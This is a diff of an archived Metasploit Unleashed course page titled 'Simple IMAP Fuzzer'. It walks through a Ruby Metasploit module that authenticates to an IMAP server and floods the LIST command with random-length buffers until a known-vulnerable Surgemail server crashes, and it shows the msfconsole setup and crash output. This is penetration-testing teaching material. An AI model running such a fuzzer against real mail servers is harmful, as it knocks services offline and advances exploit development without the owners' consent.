@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Simple IMAP Fuzzer - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Simple_IMAP_Fuzzer" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Simple_IMAP_Fuzzer&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Simple_IMAP_Fuzzer&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Simple_IMAP_Fuzzer&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,291 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Simple IMAP Fuzzer</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Simple_IMAP_Fuzzer#column-one">navigation</a>, <a href="Simple_IMAP_Fuzzer#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>During a host reconnaissance session we discovered an IMAP Mail server which is known to be vulnerable to a buffer overflow attack (Surgemail 3.8k4-4). We found an advisory for the vulnerability but can't find any working exploits in the Metasploit database nor on the internet. We then decide to write our own exploit starting with a simple IMAP fuzzer.
+<br />
+<br />
+From the advisory we do know that the vulnerable command is IMAP LIST and you need valid credentials to exploit the application. As we've previously seen, the big "library arsenal" present in MSF can help us to quickly script any network protocol and the IMAP protocol is not an exception. Including Msf::Exploit::Remote::Imap will save us a lot of time. In fact, connecting to the IMAP server and performing the authentication steps required to fuzz the vulnerable command, is just a matter of a single line command line! Here is the code for the IMAP LIST fuzzer:
+<br />
+<br />
+<pre>##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Auxiliary
+
+    include Msf::Exploit::Remote::Imap
+    include Msf::Auxiliary::Dos
+
+    def initialize
+        super(
+            'Name'           => 'Simple IMAP Fuzzer',
+            'Description'    => %q{
+                                An example of how to build a simple IMAP fuzzer.
+                                Account IMAP credentials are required in this fuzzer.
+                        },
+            'Author'         => [ 'ryujin' ],
+            'License'        => MSF_LICENSE,
+            'Version'        => '$Revision: 1 $'
+        )
+    end
+
+    def fuzz_str()
+        return Rex::Text.rand_text_alphanumeric(rand(1024))
+    end
+
+    def run()
+        srand(0)
+        while (true)
+            connected = connect_login()
+            if not connected
+                print_status("Host is not responding - this is G00D ;)")
+                break
+            end
+            print_status("Generating fuzzed data...")
+            fuzzed = fuzz_str()
+            print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
+            req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
+            print_status(req)
+            res = raw_send_recv(req)
+                if !res.nil?
+            print_status(res)
+                else
+                    print_status("Server crashed, no response")
+                    break
+                end
+            disconnect()
+        end
+    end
+end</pre>
+<br />
+Overiding the run() method, our code will be executed each time the user calls "run" from msfconsole. In the while loop within run(), we connect to the IMAP server and authenticate through the function connect_login() imported from Msf::Exploit::Remote::Imap. We then call the function fuzz_str() which generates a variable size alphanumeric buffer that is going to be sent as an argument of the LIST IMAP command through the raw_send_recv function. We save the above file in the auxiliary/dos/windows/imap/ subdirectory and load it from msfconsole as it follows:
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/dos/windows/imap/fuzz_imap</span> 
+msf auxiliary(<span style='color:#ff0000;'>fuzz_imap</span>) > <span style='color:#13C16A;'>show options</span> 
+
+Module options:
+
+   Name      Current Setting  Required  Description                              
+   ----      ---------------  --------  -----------                              
+   IMAPPASS                   no        The password for the specified username  
+   IMAPUSER                   no        The username to authenticate as          
+   RHOST                      yes       The target address                       
+   RPORT     143              yes       The target port                          
+
+msf auxiliary(<span style='color:#ff0000;'>fuzz_imap</span>) > <span style='color:#13C16A;'>set RHOST 172.16.30.7</span>
+RHOST => 172.16.30.7
+msf auxiliary(<span style='color:#ff0000;'>fuzz_imap</span>) > <span style='color:#13C16A;'>set IMAPUSER test</span>
+IMAPUSER => test
+msf auxiliary(<span style='color:#ff0000;'>fuzz_imap</span>) > <span style='color:#13C16A;'>set IMAPPASS test</span>
+IMAPPASS => test</pre>
+<br />
+We are now ready to fuzz the vulnerable IMAP server. We attach the surgemail.exe process from ImmunityDebugger and start our fuzzing session:
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>fuzz_imap</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Generating fuzzed data...
+<span style='color:#0000FF;'>[*]</span> Sending fuzzed data, buffer length = 684
+<span style='color:#0000FF;'>[*]</span> 0002 LIST () /"v1AD7DnJTVykXGYYM6BmnXL[...]" "PWNED"
+
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Generating fuzzed data...
+<span style='color:#0000FF;'>[*]</span> Sending fuzzed data, buffer length = 225
+<span style='color:#0000FF;'>[*]</span> 0002 LIST () /"lLdnxGBPh1AWt57pCvAZfiL[...]" "PWNED"
+
+<span style='color:#0000FF;'>[*]</span> 0002 OK LIST completed
+
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Generating fuzzed data...
+<span style='color:#0000FF;'>[*]</span> Sending fuzzed data, buffer length = 1007
+<span style='color:#0000FF;'>[*]</span> 0002 LIST () /"FzwJjIcL16vW4PXDPpJV[...]gaDm" "PWNED"
+
+<span style='color:#0000FF;'>[*]</span> 
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Authentication failed
+<span style='color:#0000FF;'>[*]</span> Host is not responding - this is G00D ;)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed</pre>
+<br />
+MSF tells us that the IMAP server has probably crashed and ImmunityDebugger confirms it as seen in the following image:
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:FUZZ01.png" class="image"><img alt="FUZZ01.png" src="http://www.offensive-security.com/w/images/0/04/FUZZ01.png" width="686" height="513" /></a></div></div>
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Writing_A_Simple_Fuzzer" title="Writing A Simple Fuzzer">Writing A Simple Fuzzer</a> &gt; Simple IMAP Fuzzer</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Simple_TFTP_Fuzzer" title="Simple TFTP Fuzzer">Simple TFTP Fuzzer</a> &#124; <strong class="selflink">Simple IMAP Fuzzer</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 508/1000000
+Preprocessor generated node count: 2653/1000000
+Post‐expand include size: 3840/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:40-0!*!0!*!*!2!* and timestamp 20131124115119 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Simple_IMAP_Fuzzer&amp;oldid=48">http://www.offensive-security.com/w/index.php?title=Simple_IMAP_Fuzzer&amp;oldid=48</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Writing_A_Simple_Fuzzer&amp;action=edit&amp;redlink=1" class="new" title="Category:Writing A Simple Fuzzer (page does not exist)">Writing A Simple Fuzzer</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +776,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.178 secs. --></body></html>
